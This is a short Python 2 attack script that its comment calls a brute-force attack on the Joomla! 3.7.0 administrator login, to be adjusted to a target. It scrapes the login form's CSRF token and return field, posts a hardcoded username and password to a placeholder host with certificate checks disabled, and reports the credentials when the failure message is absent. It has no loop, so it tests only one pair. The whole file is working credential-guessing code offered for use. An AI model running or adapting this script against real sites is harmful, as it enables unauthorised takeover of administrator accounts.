#!/usr/bin/python

# Python script to perform a brute force attack against Joomla! 3.7.0
# It must be adjusted to the target.

import requests
import sys

requests.packages.urllib3.disable_warnings()

server = 'http://girtab.stars.example/joomla/administrator/index.php'
user = 'admin'
password = 'password1!'

r1 = requests.get(server,verify=False)
s1 = r1.text.split('<input type="hidden" name="task" value="login"/>')
s2 = s1[1].split('<input type="hidden" name="return" value="')
ret = s2[1].split('"')[0]
s3 = s2[1].split('<input type="hidden" name="')
name = s3[1].split('"')[0]

postvars = {'username':user,
            'passwd':password,
            'option':'com_login',
            'task':'login',
            'return':ret,
            name:'1'}

r2 = requests.post(server,postvars,cookies=r1.cookies,verify=False)

if not ('Username and password do not match' in r2.text):
   print "User: {}\nPassword: {}".format(user,password)
